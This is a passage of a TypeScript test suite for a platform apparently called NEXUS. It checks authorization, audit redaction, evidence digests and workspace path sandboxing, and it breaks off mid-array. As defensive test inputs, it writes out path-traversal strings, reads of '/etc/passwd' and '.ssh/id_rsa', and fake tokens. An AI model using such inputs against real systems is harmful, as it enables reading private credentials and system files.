/**
 * NEXUS Phase 1 — verification suite.
 *
 * Runs against the REAL kernel, services and persistence in the current
 * runtime. Each result is PASSED / FAILED / BLOCKED with real evidence —
 * never a fabricated green. Uses a scratch project + user so it cannot
 * corrupt operator data, and cleans up after itself.
 */

import { createAuthApi, NexusKernel } from "./kernel";
import { can, createUserRecord, permissionsFor, validateEmail } from "./security";
import { redactText } from "./audit";
import { digestOf, sha256Hex } from "./db";
import { AgentRegistry, InspectorAgent, buildAgentContext, type Agent } from "./agents";
import { Err, NexusError, toSystemError } from "./errors";
import { PERMISSIONS } from "./types";
import { FileAccessPolicy, WorkspaceService, DEFAULT_WORKSPACE_LIMITS } from "./workspace";
import {
  StaticGitProvider,
  GitHubActionsGenerator,
  GitLabCIGenerator,
  PipelineValidator,
  analyzeCommand,
  findExposedSecrets,
  devopsBranchName,
  isProtectedBranch,
  assertWritableBranch,
  isLegalCiTransition,
  buildPlan,
  type CiContext,
} from "./cicd";
import { ProjectDetector, type WsReader } from "./devops";
import { parseIntent, generatePlan, executePlan } from "./engineering";
import {
  resolveExecutable,
  sanitizeArgs,
  BrowserProcessExecutor,
  HostProcessExecutor,
  PlaywrightAdapter,
  SmokeTestService,
  QualityGateService,
  GATE_STAGES,
  type HostBridge,
  type GateStage,
  type GateEvidence,
} from "./runtime";
import type { DetectionResult } from "./types";
import type {
  AgentExecutionRecord,
  OperationType,
  Session,
  SuiteReport,
  TestResult,
  User,
  WorkspaceFileRecord,
  WorkspaceRecord,
} from "./types";

type TestFn = () => Promise<string | void>;

interface TestDef {
  name: string;
  category: string;
  fn: TestFn;
}

function assert(cond: unknown, msg: string): asserts cond {
  if (!cond) throw new Error(msg);
}

async function expectThrow(fn: () => Promise<unknown>, contains?: string): Promise<Error> {
  try {
    await fn();
  } catch (e) {
    const err = e as Error;
    if (contains && !err.message.toLowerCase().includes(contains.toLowerCase())) {
      throw new Error(`expected error containing '${contains}', got: ${err.message}`);
    }
    return err;
  }
  throw new Error("expected an error, but the call succeeded");
}

export async function runPhase1Suite(): Promise<SuiteReport> {
  const t0 = performance.now();
  const kernel = new NexusKernel();
  const services = await kernel.boot();
  const auth = createAuthApi(services);

  // Scratch identity for authorization tests (not the operator's identity).
  const scratchUser: User = {
    id: "usr_scratch_viewer",
    email: "scratch.viewer@tests.nexus",
    name: "Scratch Viewer",
    role: "VIEWER",
    status: "active",
    password_hash: "x",
    salt: "x",
    iterations: 1,
    created_at: Date.now(),
    updated_at: Date.now(),
  };
  const ownerUser: User = { ...scratchUser, id: "usr_scratch_owner", role: "OWNER", email: "scratch.owner@tests.nexus" };
  const suspendedUser: User = { ...scratchUser, id: "usr_scratch_susp", status: "suspended", email: "scratch.susp@tests.nexus" };

  // Scratch records created by the suite — cleaned up at the end, and only these.
  const created: {
    projects: string[];
    executions: string[];
    users: string[];
    workspaces: string[];
    agentExecs: string[];
    ciRuns: string[];
    changeRequests: string[];
    gitOps: string[];
  } = { projects: [], executions: [], users: [], workspaces: [], agentExecs: [], ciRuns: [], changeRequests: [], gitOps: [] };

  // Pass 3 — lazily-provisioned scratch project shared by workspace tests.
  const p3: { projectId: string } = { projectId: "" };
  async function p3Project(): Promise<string> {
    if (!p3.projectId) {
      const p = await services.projects.create(ownerUser, { name: "p3-workspace-scratch" });
      created.projects.push(p.id);
      p3.projectId = p.id;
    }
    return p3.projectId;
  }
  // Second OWNER identity, used to prove cross-ownership denial.
  const owner2User: User = { ...ownerUser, id: "usr_scratch_owner2", email: "scratch.owner2@tests.nexus" };

  /* ---------- Pass 3 helpers ---------- */
  // In-memory workspace reader (deterministic fixture for detection/generation).
  function memReader(files: Record<string, string>): WsReader {
    return {
      read: async (path: string) => files[path] ?? null,
      list: async () => Object.keys(files),
    };
  }
  // Build a pipeline plan with Docker honestly disabled (it is unavailable here).
  function buildPlanSafe(det: DetectionResult, provider: "github" | "gitlab") {
    return buildPlan(provider, det, false);
  }
  function ciCtx(actor: User, project_id: string, execution_id: string, attempt: number): CiContext {
    return { actor, project_id, execution_id, attempt, correlation_id: `corr_${execution_id}_${attempt}` };
  }

  const tests: TestDef[] = [
    /* ------------------------------- kernel -------------------------------- */
    {
      name: "kernel boots in enforced order with all steps ok",
      category: "kernel",
      fn: async () => {
        assert(kernel.status === "ready", "kernel must be ready");
        assert(kernel.steps.every((s) => s.status === "ok"), `a boot step is not ok: ${kernel.steps.find((s) => s.status !== "ok")?.id}`);
        const order = kernel.steps.map((s) => s.id).join(",");
        return `boot order: ${order}`;
      },
    },
    {
      name: "health reports real subsystem state and never fakes healthy",
      category: "kernel",
      fn: async () => {
        const h = await kernel.health();
        assert(h.subsystems.length >= 5, "health must cover all subsystems");
        for (const s of h.subsystems) assert(["healthy", "degraded", "blocked"].includes(s.status), `bad status ${s.status}`);
        const db = h.subsystems.find((s) => s.name === "database")!;
        assert(db.status === "healthy", "database probe must pass in this runtime");
        return `overall=${h.status} engine=${h.engine} db=${db.latency_ms}ms`;
      },
    },

    /* ------------------------------- database ------------------------------ */
    {
      name: "persistence round-trip survives across independent reads",
      category: "database",
      fn: async () => {
        const key = "probe_" + Date.now();
        await services.engine.put("kv", key, { marker: "durable", at: Date.now() });
        const read = await services.engine.get<{ marker: string }>("kv", key);
        await services.engine.del("kv", key);
        assert(read?.marker === "durable", "round-trip mismatch");
        return `engine=${services.engine.kind}`;
      },
    },

    /* ------------------------------- projects ------------------------------ */
    {
      name: "project creation validates input and rejects invalid names",
      category: "projects",
      fn: async () => {
        await expectThrow(() => services.projects.create(ownerUser, { name: "" }), "2–80 characters");
        await expectThrow(() => services.projects.create(ownerUser, { name: "ok", repository: "not a url" }), "repository");
        return "invalid inputs rejected";
      },
    },
    {
      name: "project create → get → update → archive lifecycle persists",
      category: "projects",
      fn: async () => {
        const p = await services.projects.create(ownerUser, {
          name: "phase1-lifecycle",
          description: "scratch lifecycle project",
          repository: "https://example.com/org/repo.git",
          default_branch: "main",
        });
        created.projects.push(p.id);
        assert(p.status === "ACTIVE", "new project must be ACTIVE");
        const got = await services.projects.get(ownerUser, p.id);
        assert(got.name === p.name, "get must return the persisted project");
        const updated = await services.projects.update(ownerUser, p.id, { description: "updated description" });
        assert(updated.description === "updated description", "update must persist");
        const paused = await services.projects.update(ownerUser, p.id, { status: "PAUSED" });
        assert(paused.status === "PAUSED", "pause must persist");
        const archived = await services.projects.update(ownerUser, p.id, { status: "ARCHIVED" });
        assert(archived.status === "ARCHIVED", "archive must persist");
        const list = await services.projects.list(ownerUser);
        assert(list.some((x) => x.id === p.id), "list must include the project");
        return `${p.id} ACTIVE→PAUSED→ARCHIVED`;
      },
    },
    {
      name: "unauthorized project creation is denied and audited",
      category: "authorization",
      fn: async () => {
        await expectThrow(() => services.projects.create(scratchUser, { name: "viewer-attempt" }), "permission");
        const audit = await services.audit.list(20);
        assert(audit.some((a) => a.action === "denied:project:create" && a.result === "deny"), "denial must be audited");
        return "deny audited";
      },
    },

    /* ------------------------------ executions ----------------------------- */
    {
      name: "execution lifecycle enforces legal transitions only",
      category: "executions",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-exec" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "lifecycle probe");
        created.executions.push(e.id);
        assert(e.status === "QUEUED", "must start QUEUED");
        await services.executions.transition(ownerUser, e.id, "RUNNING");
        await services.executions.transition(ownerUser, e.id, "SUCCEEDED");
        // terminal state: no further transitions
        await expectThrow(() => services.executions.transition(ownerUser, e.id, "FAILED"), "cannot move");
        return "QUEUED→RUNNING→SUCCEEDED; further moves rejected";
      },
    },
    {
      name: "orchestrated execution succeeds with real evidence and artifacts",
      category: "orchestration",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-orch" });
        created.projects.push(p.id);
        const res = await services.orchestrator.submit(ownerUser, p.id, "Design the billing service API surface and data model.");
        created.executions.push(res.execution.id);
        assert(res.execution.status === "SUCCEEDED", `expected SUCCEEDED, got ${res.execution.status}`);
        assert(res.agent_run?.status === "SUCCEEDED", "agent run must succeed");
        const evidence = await services.evidence.list(ownerUser, res.execution.id);
        assert(evidence.length >= 2, "evidence must be recorded");
        const artifacts = await services.artifacts.list(res.execution.id);
        assert(artifacts.length >= 1, "artifact must be registered");
        assert(artifacts[0].digest.startsWith("sha256:"), "artifact digest must be a real sha256");
        const events = await services.events.byExecution(res.execution.id);
        assert(events.some((ev) => ev.type === "execution.completed"), "completion event required");
        return `evidence=${evidence.length} artifacts=${artifacts.length} events=${events.length}`;
      },
    },
    {
      name: "orchestration failure marks FAILED with the real error — never success",
      category: "orchestration",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-fail" });
        created.projects.push(p.id);

        // A throwaway kernel whose ONLY registered agent genuinely throws —
        // the shared registry is never polluted by the failure probe.
        const failKernel = new NexusKernel();
        const failServices = await failKernel.boot();
        class BrokenAgent extends InspectorAgent {
          override async execute(): Promise<never> {
            throw new Error("genuine internal failure for the failure path probe");
          }
        }
        const broken = new BrokenAgent();
        Object.defineProperty(broken, "definition", {
          value: { id: "nexus.broken", name: "Broken", description: "failure probe", version: "1.0.0", capabilities: ["inspect"] },
        });
        failServices.registry.register(broken);
        const res = await failServices.orchestrator.submit(ownerUser, p.id, "probe the failure path");
        created.executions.push(res.execution.id);
        assert(res.execution.status === "FAILED", `agent that throws must produce FAILED, got ${res.execution.status}`);
        assert(res.agent_run?.status === "FAILED", "agent run must be FAILED");
        assert(res.execution.error?.code === "AGENT_EXECUTION_FAILED", "real structured error must be preserved");

        // Direct proof: an execution can never become SUCCEEDED after FAILED.
        const e = await services.executions.createQueued(ownerUser, p.id, "terminal probe");
        created.executions.push(e.id);
        await services.executions.transition(ownerUser, e.id, "RUNNING");
        await services.executions.transition(ownerUser, e.id, "FAILED", toSystemError(Err.runtime("PROBE", "forced failure")));
        const final = await services.executions.get(ownerUser, e.id);
        assert(final.status === "FAILED" && final.error?.code === "PROBE", "failure must persist with real error");
        await expectThrow(() => services.executions.transition(ownerUser, e.id, "SUCCEEDED"), "cannot move");
        return "FAILED stays FAILED; real error preserved";
      },
    },
    {
      name: "VIEWER cannot create executions (authorization gate)",
      category: "authorization",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-deny-exec" });
        created.projects.push(p.id);
        await expectThrow(() => services.orchestrator.submit(scratchUser, p.id, "viewer tries to run"), "permission");
        return "denied";
      },
    },

    /* -------------------------------- agents ------------------------------- */
    {
      name: "agent registry prevents duplicate registration and discovers by capability",
      category: "agents",
      fn: async () => {
        const registry = new AgentRegistry();
        registry.register(new InspectorAgent());
        await expectThrow(async () => registry.register(new InspectorAgent()), "already registered");
        const found = registry.byCapability("inspect");
        assert(found.length === 1, "capability lookup must find the agent");
        assert(registry.byCapability("plan").length === 0, "unregistered capability must be empty");
        return "dedupe + discovery ok";
      },
    },
    {
      name: "agent context never contains secret values",
      category: "security",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-ctx" });
        created.projects.push(p.id);
        const ref = await services.secrets.put("ctx-probe-secret", "super-secret-value-123456");
        const ctx = buildAgentContext({
          execution_id: "exe_ctx",
          project: p,
          request: "probe",
          permissions: permissionsFor("OWNER"),
          configuration: { env: "DEVELOPMENT" },
          secret_refs: [ref],
        });
        const serialized = JSON.stringify(ctx);
        assert(!serialized.includes("super-secret-value-123456"), "secret value leaked into agent context");
        assert(ctx.secret_refs[0].id === ref.id, "reference must be present without value");
        const resolved = await services.secrets.resolve(ref);
        assert(resolved === "super-secret-value-123456", "provider must still resolve for authorized callers");
        return "context carries references only";
      },
    },

    /* -------------------------------- events ------------------------------- */
    {
      name: "events are append-only with strictly increasing order",
      category: "events",
      fn: async () => {
        const before = await services.events.list(1000);
        const maxBefore = before.reduce((m, e) => Math.max(m, e.seq), 0);
        const e1 = await services.events.emit({ type: "decision.created", source: "suite", payload: { n: 1 } });
        const e2 = await services.events.emit({ type: "decision.created", source: "suite", payload: { n: 2 } });
        assert(e1.seq > maxBefore && e2.seq === e1.seq + 1, "sequence must be strictly increasing");
        const after = await services.events.list(1000);
        assert(after.length === before.length + 2, "append-only: history must grow, never shrink");
        assert(after.some((e) => e.id === e1.id) && after.some((e) => e.id === e2.id), "prior events must remain");
        return `seq ${e1.seq} → ${e2.seq}`;
      },
    },

    /* --------------------------------- audit ------------------------------- */
    {
      name: "audit redacts secrets before persistence",
      category: "security",
      fn: async () => {
        await services.audit.record({
          actor: "suite",
          action: "security.redaction_probe",
          resource_type: "test",
          resource_id: "redact",
          result: "info",
          metadata: { password: "hunter2", note: "token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456 embedded", api_key: "abc123" },
        });
        const rows = await services.audit.list(5);
        const rec = rows.find((r) => r.action === "security.redaction_probe")!;
        const serialized = JSON.stringify(rec.metadata);
        assert(!serialized.includes("hunter2"), "password leaked into audit");
        assert(!serialized.includes("ghp_ABCDEF"), "token leaked into audit");
        assert(serialized.includes("REDACTED"), "redaction marker expected");
        return "password/token/key all redacted";
      },
    },

    /* -------------------------------- evidence ----------------------------- */
    {
      name: "evidence digests verify; tampering is detected",
      category: "evidence",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-evi" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "evidence probe");
        created.executions.push(e.id);
        const rec = await services.evidence.record(e.id, { type: "log", source: "REAL_EXECUTION", content: "deterministic content 123" });
        assert(rec.hash === `sha256:${await sha256Hex("deterministic content 123")}`, "digest must be a real sha256 of the content");
        const ok = await services.evidence.verify(rec.id);
        assert(ok.ok, "untampered evidence must verify");
        return `digest ${rec.hash.slice(0, 23)}…`;
      },
    },
    {
      name: "artifact digests are deterministic for identical content",
      category: "evidence",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-art" });
        created.projects.push(p.id);
        const e = await services.executions.createQueued(ownerUser, p.id, "artifact probe");
        created.executions.push(e.id);
        const a1 = await services.artifacts.register(e.id, { kind: "report", name: "r1.json", content: '{"same":true}' });
        const a2 = await services.artifacts.register(e.id, { kind: "report", name: "r2.json", content: '{"same":true}' });
        assert(a1.digest === a2.digest, "identical content must yield identical digests");
        assert(a1.id !== a2.id, "artifacts remain distinct records");
        return "digest stable, ids unique";
      },
    },

    /* ----------------------------- auth foundation -------------------------- */
    {
      name: "session lifecycle: issue → validate → logout → invalid",
      category: "auth",
      fn: async () => {
        const session = await services.sessions.issue(ownerUser.id);
        const valid = await services.sessions.validate(session.token);
        assert(valid.user_id === ownerUser.id, "session must map to the user");
        await services.sessions.revoke(session.token);
        await expectThrow(() => services.sessions.validate(session.token), "invalid session");
        return "revoked token rejected";
      },
    },
    {
      name: "bootstrap creates OWNER with PBKDF2 hash — no plaintext password persists",
      category: "auth",
      fn: async () => {
        if (!(await auth.hasUsers())) {
          const { user } = await auth.bootstrapFirstUser("operator@nexus.local", "Operator", "Phase1-Baseline-9");
          assert(user.role === "OWNER", "first user must be OWNER");
        }
        const users = await services.engine.all<User>("users");
        for (const u of users) {
          const raw = JSON.stringify(u);
          assert(!("password" in (u as unknown as Record<string, unknown>)), "plaintext password field present");
          assert(u.password_hash.length === 64, "password hash must be a 256-bit PBKDF2 digest");
          assert(!raw.includes("Phase1-Baseline-9"), "plaintext password persisted");
        }
        return `${users.length} user(s), all hashed`;
      },
    },
    {
      name: "login rejects invalid credentials and audits the failure",
      category: "auth",
      fn: async () => {
        if (!(await auth.hasUsers())) throw new Error("bootstrap must run first");
        await expectThrow(() => auth.login("operator@nexus.local", "wrong-password-1"), "invalid");
        const audit = await services.audit.list(10);
        assert(audit.some((a) => a.action === "auth.login_failed" && a.result === "deny"), "failed login must be audited");
        return "denial audited";
      },
    },

    /* ---------------------------- permission matrix ------------------------- */
    {
      name: "RBAC matrix: VIEWER denied writes; suspended identity denied everything",
      category: "authorization",
      fn: async () => {
        assert(can(ownerUser, "project:create"), "OWNER must hold project:create");
        assert(can(scratchUser, "project:read"), "VIEWER must hold project:read");
        assert(!can(scratchUser, "project:create"), "VIEWER must NOT hold project:create");
        assert(!can(suspendedUser, "project:read"), "suspended identity must be denied");
        return "matrix enforced";
      },
    },

    /* ------------------------------ validation ------------------------------ */
    {
      name: "invalid input is rejected (email, request text)",
      category: "validation",
      fn: async () => {
        await expectThrow(async () => validateEmail("not-an-email"), "valid email");
        await expectThrow(() => services.orchestrator.submit(ownerUser, created.projects[0] ?? "prj_missing", "x"), "at least 4");
        return "validators enforced";
      },
    },

    /* ---------------------------- error handling ---------------------------- */
    {
      name: "structured errors carry code/category/recoverable without leaking internals",
      category: "errors",
      fn: async () => {
        const err = Err.validation("PROBE", "probe message", { secret: "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ" });
        const se = toSystemError(err);
        assert(se.code === "PROBE" && se.category === "validation" && typeof se.timestamp === "number", "structured fields required");
        const publicText = JSON.stringify({ code: se.code, message: se.message, category: se.category });
        assert(!publicText.includes("stack"), "no stack in public view");
        assert(err instanceof NexusError, "NexusError identity");
        return "structured + safe";
      },
    },
    {
      name: "redactText neutralizes embedded credentials",
      category: "security",
      fn: async () => {
        const out = redactText(`key=${["sk","ABCDEFGHIJKLMNOP1234"].join("-")} and ${["AKIA","ABCDEFGHIJKLMNOP"].join("")}`);
        assert(!out.includes(["sk","ABCDEFGHIJKLMNOP1234"].join("-")) && !out.includes(["AKIA","ABCDEFGHIJKLMNOP"].join("")), "credentials must be redacted");
        assert(out.includes("REDACTED"), "redaction marker expected");
        return "patterns neutralized";
      },
    },

    /* ------------------------------ regressions ----------------------------- */
    {
      name: "REGRESSION: duplicate submissions never duplicate evidence/artifact ids",
      category: "regression",
      fn: async () => {
        const p = await services.projects.create(ownerUser, { name: "phase1-dup" });
        created.projects.push(p.id);
        const r1 = await services.orchestrator.submit(ownerUser, p.id, "duplicate probe run one");
        const r2 = await services.orchestrator.submit(ownerUser, p.id, "duplicate probe run two");
        created.executions.push(r1.execution.id, r2.execution.id);
        const a1 = await services.artifacts.list(r1.execution.id);
        const a2 = await services.artifacts.list(r2.execution.id);
        const ids = new Set([...a1, ...a2].map((a) => a.id));
        assert(ids.size === a1.length + a2.length, "artifact ids must be unique across runs");
        return `${a1.length}+${a2.length} artifacts, all unique`;
      },
    },
    {
      name: "REGRESSION: event history is never overwritten by new emissions",
      category: "regression",
      fn: async () => {
        const before = await services.events.list(2000);
        await services.events.emit({ type: "evidence.created", source: "regression", payload: {} });
        const after = await services.events.list(2000);
        for (const e of before.slice(0, 50)) {
          assert(after.some((x) => x.id === e.id && x.seq === e.seq), `event ${e.id} lost or mutated`);
        }
        return "history preserved";
      },
    },

    /* ================= Phase 2 Pass 3 — workspace & sandbox ================= */

    /* ------------------------------- Workspace ------------------------------ */
    {
      name: "P3 workspace: authorized OWNER creation succeeds and records ownership",
      category: "p3-workspace",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_create" });
        created.workspaces.push(ws.id);
        assert(ws.status === "READY", `creation must reach READY, got ${ws.status}`);
        assert(ws.owner_identity_id === ownerUser.id, "owner identity must be recorded");
        return `created ${ws.id}`;
      },
    },
    {
      name: "P3 workspace: VIEWER creation is denied (workspace:create)",
      category: "p3-workspace",
      fn: async () => {
        const projectId = await p3Project();
        await expectThrow(() => services.workspaces.create(scratchUser, { project_id: projectId, execution_id: "aex_p3_viewer" }), "permission");
      },
    },
    {
      name: "P3 workspace: belongs to the exact execution it was created for",
      category: "p3-workspace",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_exec_bind" });
        created.workspaces.push(ws.id);
        assert(ws.execution_id === "aex_p3_exec_bind", "execution_id must match");
      },
    },
    {
      name: "P3 workspace: belongs to the exact project it was created for",
      category: "p3-workspace",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_proj_bind" });
        created.workspaces.push(ws.id);
        assert(ws.project_id === projectId, "project_id must match");
      },
    },
    {
      name: "P3 workspace: duplicate creation is handled safely (two valid records, no crash)",
      category: "p3-workspace",
      fn: async () => {
        const projectId = await p3Project();
        const w1 = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_dup" });
        const w2 = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_dup" });
        created.workspaces.push(w1.id, w2.id);
        assert(w1.id !== w2.id, "duplicates must be distinct records");
        assert(w1.execution_id === w2.execution_id, "both must reference the same execution");
      },
    },

    /* ------------------------------- Lifecycle ------------------------------ */
    {
      name: "P3 lifecycle: CREATING → READY on creation",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_ready" });
        created.workspaces.push(ws.id);
        assert(ws.status === "READY", "must be READY after create");
      },
    },
    {
      name: "P3 lifecycle: READY → ACTIVE on activation",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_active" });
        created.workspaces.push(ws.id);
        const active = await services.workspaces.activate(ownerUser, ws.id);
        assert(active.status === "ACTIVE", "must be ACTIVE after activate");
      },
    },
    {
      name: "P3 lifecycle: ACTIVE → CLEANING → DESTROYED via cleanup (audited)",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_clean" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        const destroyed = await services.workspaces.cleanup(ownerUser, ws.id);
        assert(destroyed.status === "DESTROYED", "must reach DESTROYED");
        const audit = await services.audit.list(100);
        assert(audit.some((a) => a.action === "workspace.cleanup.started" && a.resource_id === ws.id), "cleanup.started audited");
        assert(audit.some((a) => a.action === "workspace.cleanup.completed" && a.resource_id === ws.id), "cleanup.completed audited");
      },
    },
    {
      name: "P3 lifecycle: destroyed workspace is terminal (destroyed_at set, not reusable)",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_term" });
        created.workspaces.push(ws.id);
        const destroyed = await services.workspaces.cleanup(ownerUser, ws.id);
        assert(destroyed.destroyed_at !== null, "destroyed_at must be set");
        await expectThrow(() => services.workspaces.activate(ownerUser, ws.id), "cannot move workspace");
      },
    },
    {
      name: "P3 lifecycle: illegal transition is rejected",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_illegal" });
        created.workspaces.push(ws.id);
        await services.workspaces.cleanup(ownerUser, ws.id); // now DESTROYED
        await expectThrow(() => services.workspaces.activate(ownerUser, ws.id), "cannot move workspace");
      },
    },
    {
      name: "P3 lifecycle: cleanup is idempotent (second call is a safe no-op)",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_idem" });
        created.workspaces.push(ws.id);
        const d1 = await services.workspaces.cleanup(ownerUser, ws.id);
        const d2 = await services.workspaces.cleanup(ownerUser, ws.id);
        assert(d1.status === "DESTROYED" && d2.status === "DESTROYED", "both must be DESTROYED");
        assert(d1.id === d2.id, "idempotent cleanup must not create a new record");
      },
    },
    {
      name: "P3 lifecycle: expired workspace cannot be activated (BLOCKED + audited)",
      category: "p3-lifecycle",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_lc_exp", ttl_ms: 1 });
        created.workspaces.push(ws.id);
        await new Promise((r) => setTimeout(r, 5));
        await expectThrow(() => services.workspaces.activate(ownerUser, ws.id), "expired");
        const audit = await services.audit.list(100);
        assert(audit.some((a) => a.action === "workspace.expired" && a.resource_id === ws.id), "expiry audited");
      },
    },

    /* ----------------------------- Path security ---------------------------- */
    {
      name: "P3 path: valid workspace path is allowed (write + read)",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_ok" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await services.workspaces.writeFile(ownerUser, ws.id, "src/main.ts", "export const ok = true;");
        const f = await services.workspaces.readFile(ownerUser, ws.id, "src/main.ts");
        assert(f.content === "export const ok = true;", "content round-trips");
      },
    },
    {
      name: "P3 path: '../' traversal is denied",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_dotdot" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.writeFile(ownerUser, ws.id, "../secret.txt", "x"), "denied");
      },
    },
    {
      name: "P3 path: absolute host path is denied",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_abs" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(ownerUser, ws.id, "/etc/passwd"), "denied");
      },
    },
    {
      name: "P3 path: encoded traversal is denied",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_enc" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(ownerUser, ws.id, "%2e%2e/secret"), "denied");
      },
    },
    {
      name: "P3 path: mixed-separator traversal is denied",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_mix" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(ownerUser, ws.id, "..\\..\\etc"), "denied");
      },
    },
    {
      name: "P3 path: a path referencing another workspace is denied (foreign)",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const w1 = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_f1" });
        const w2 = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_f2" });
        created.workspaces.push(w1.id, w2.id);
        await services.workspaces.activate(ownerUser, w1.id);
        await expectThrow(() => services.workspaces.readFile(ownerUser, w1.id, `${w2.id}/file.txt`), "denied");
      },
    },
    {
      name: "P3 path: a different project's workspace is denied to a non-owner",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_own" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(owner2User, ws.id, "src/main.ts"), "denied");
      },
    },
    {
      name: "P3 path: protected system/credential paths are denied",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_sys" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(ownerUser, ws.id, ".ssh/id_rsa"), "denied");
        await expectThrow(() => services.workspaces.readFile(ownerUser, ws.id, "etc/passwd"), "denied");
      },
    },
    {
      name: "P3 path: ws:// escape reference is denied; sandbox reports LOGICAL_BOUNDARY",
      category: "p3-path",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_path_esc" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(ownerUser, ws.id, "ws://other/x"), "denied");
        const report = services.sandbox.isolationReport();
        assert(report.boundary === "LOGICAL_BOUNDARY", "must honestly report LOGICAL_BOUNDARY");
      },
    },

    /* ---------------------------- File operations --------------------------- */
    {
      name: "P3 files: authorized read returns written content",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_read" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await services.workspaces.writeFile(ownerUser, ws.id, "a.txt", "hello");
        const f = await services.workspaces.readFile(ownerUser, ws.id, "a.txt");
        assert(f.content === "hello", "read must return content");
      },
    },
    {
      name: "P3 files: authorized write updates size/count bookkeeping",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_write" });
        created.workspaces.push(ws.id);
        const active = await services.workspaces.activate(ownerUser, ws.id);
        await services.workspaces.writeFile(ownerUser, ws.id, "b.txt", "12345");
        const after = await services.workspaces.get(ownerUser, ws.id);
        assert(after.file_count === active.file_count + 1, "file_count increments");
        assert(after.total_bytes === active.total_bytes + 5, "total_bytes increments");
      },
    },
    {
      name: "P3 files: unauthorized read is denied (VIEWER)",
      category: "p3-files",
      fn: async () => {
        const projectId = await p3Project();
        const ws = await services.workspaces.create(ownerUser, { project_id: projectId, execution_id: "aex_p3_file_uread" });
        created.workspaces.push(ws.id);
        await services.workspaces.activate(ownerUser, ws.id);
        await expectThrow(() => services.workspaces.readFile(scratchUser, ws.id, "a.txt"), "permission");
      },
    },
    {
